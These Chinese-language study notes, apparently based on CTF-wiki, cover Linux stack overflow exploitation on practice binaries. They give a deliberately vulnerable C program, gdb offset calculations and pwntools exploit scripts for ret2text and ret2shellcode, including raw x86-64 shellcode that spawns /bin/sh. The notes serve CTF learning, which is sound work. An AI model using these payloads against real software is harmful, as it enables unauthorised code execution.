# 栈溢出

## [栈溢出原理](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/stackoverflow_basic/)

样例

```c
// stack_example.c
#include <stdio.h>
#include <string.h>
void success() { puts("You Hava already controlled it."); }
void vulnerable() {
  char s[12];
  gets(s);
  puts(s);
  return;
}
int main(int argc, char **argv) {
  vulnerable();
  return 0;
}
```

编译指令：

```bash
stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example
```

断点下在 `vulnerable()` 上，查看栈帧。

此时 `$esp` 的地址为 `0xffffce20` ，`$ebp` 的地址为 `0xffffce38` 。由于 `s` 的地址相对 `$esp` 的偏移为 `+4h` ，因此 `s` 的地址为 ` 0xffffce24` ，相对 `$ebp` 的偏移就是 `0x14` ，相对于返回地址的偏移为 `0x14+0x4=0x18` 。又知 `success()` 函数地址为`0x804843B` ，可以构造payload：

```python
from pwn import *
success_addr = 0x804843B
p = process('./stack_example')
payload = 'a'*(0x14+0x4)+p32(success_addr)
p.sendline(payload)
p.interactive()
```

就能成功执行了。

## [基本ROP](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/basic_rop/)

ROP概念

### ret2text

简介：

控制程序执行程序本身已有的代码。

核心

确定我们能够控制的内存的起始地址距离 main 函数的返回地址的字节数。

样例

分析 ret2text：

checksec

```
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

打开IDA分析

发现gets函数存在栈溢出的可能，在`secure()`函数中发现了`system("/bin/sh");`这一指令。

查看汇编指令及相应的内存地址，我们我们需要将返回值返回到这里就可以了。

将断点下在 `0x080486AE` 并进行调试。

此时 `$esp` 的值为 `0xffffcde0` ，`$ebp` 的值为 `0xffffce68 ` 。由IDA的反汇编知字符串 `s` 相对于 `$esp` 的偏移为 `0x1c` ，所以 `s` 的地址为 `0xffffcdfc` 。所以 `s` 相对 `$ebp` 的偏移为 `0x6c` ，相对于返回地址的偏移为`0x6c+4=0x70` 。则可以构造出 payload:

```python
import pwn
p = pwn.process('./ret2text')
sh_addr = 0x0804863A
p.sendline('a'*(0x6c+4)+pwn.p32(sh_addr))
p.interactive()
```

这样就可以拿到shell了。

### ret2shellcode

简介：

控制程序执行 shellcode代码

核心：

在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。

样例

首先 `checksec`

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/ret2shellcode'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

没有任何保护，还有可执行可读可写段。

用IDA查看它的大概逻辑，将输入的字符串 `s` 拷贝到了位于 `.bss` 段的 `buf2` 处。其地址为 `0x804A080` 。

使用 `vmmap` 指令查看该 `bss` 段是否可执行。

具体操作如下：

使用 gdb 将断点下在 `main` 处，运行，输入命令 `vmmap` ，发现有如下输出：

```bash
0x08048000 0x08049000 r-xp	/home/qrz/Desktop/pwn-study/ret2shellcode
0x08049000 0x0804a000 r-xp	/home/qrz/Desktop/pwn-study/ret2shellcode
0x0804a000 0x0804b000 rwxp	/home/qrz/Desktop/pwn-study/ret2shellcode
0xf7dfb000 0xf7dfc000 rwxp	mapped
0xf7dfc000 0xf7fac000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fac000 0xf7fae000 r-xp	/lib/i386-linux-gnu/libc-2.23.so
0xf7fae000 0xf7faf000 rwxp	/lib/i386-linux-gnu/libc-2.23.so
0xf7faf000 0xf7fb2000 rwxp	mapped
0xf7fd3000 0xf7fd4000 rwxp	mapped
0xf7fd4000 0xf7fd7000 r--p	[vvar]
0xf7fd7000 0xf7fd9000 r-xp	[vdso]
0xf7fd9000 0xf7ffc000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffc000 0xf7ffd000 r-xp	/lib/i386-linux-gnu/ld-2.23.so
0xf7ffd000 0xf7ffe000 rwxp	/lib/i386-linux-gnu/ld-2.23.so
0xfffdd000 0xffffe000 rwxp	[stack]
```

发现我们要用的那一段

```bash
0x0804a000 0x0804b000 rwxp	/home/qrz/Desktop/pwn-study/ret2shellcode
```

是可以执行的。

于是我们的思路是这样的：

输入 `shellcode` ，它会被拷贝到相应的 `.bss` 段，接下来我们通过ROP的方式使得返回地址指向该段的地址就可以了。

看看这时 `main` 函数的栈帧：

`$esp` =` 0xffffcdd0` ，`$ebp` = `0xffffce58` ，`s_addr` = `0xffffcdec` 

`s` 到栈底的距离为 `0xe58-0xdec=0x6c` 。

这时就可以构造 `payload` 了。

```python
# --*--coding:utf-8--*--
from pwn import *
p = process('./ret2shellcode')
shellcode = asm(shellcraft.sh())
buf2_addr = 0x0804A080
payload = shellcode.ljust((0x6c+4),'a')+p32(buf2_addr)
p.sendline(payload)
p.interactive()
```

这里用到了 pwntools 自带的 `shellcraft.sh()` 方法。其他的方法还需要相应的学习。

查看shellcode的网站：https://www.exploit-db.com/shellcode/

这里他布置了一道习题：sniperoj-pwn100-shellcode-x86-64 ，我们来看一下：

```bash
[*] '/mnt/f/github/pwn-study/Linux-pwn/shellcode'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

发现是64位的，接着看源代码：

中间有一处打印出来了 `buf` 的地址，可以使用之。

根据wp：

>通过
>
>```
>  __int64 buf; // [sp+0h] [bp-10h]@1
>  read(0, &buf, 0x40uLL);
>```
>
>可以知道buf相对于ebp的偏移为0x10,所以其可用的shellcode空间为16+8=24。我找了到了一个长度为23的shellcode。但是其本身是有push指令的，这时候如果我们把shellcode放在最前面，在程序leave的时候，在执行这些就会被覆盖。

不得不佩服一下，这个我真的没有想到。就是说`buf`后面 `0x10+0x8` 大小的空间都不可以使用，因为在那之前的 `leave` 指令会将这一段覆盖掉。既然这样，我们跳过这一段就可以了。

这时的payload就是：

```bash
'a'*(0x10+8)+(buf_addr+(0x10+8+8))+shellcode
```

这个payload的长度是55，小于 0x40 。我们还可以试试其他的shellcode。在这之前，我们把它转换成代码吧。

```python
# --*-- coding:utf-8 --*--
from pwn import *

p = process('./shellcode')

shellcode_x64 = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
p.recvuntil('[')
buf_addr = p.recvuntil(']', drop=True)
buf_addr = int(buf_addr, 16)

payload = 'a'*24+p64(buf_addr+32)+shellcode_x64
print(len(payload))
p.sendline(payload)
p.interactive()
```

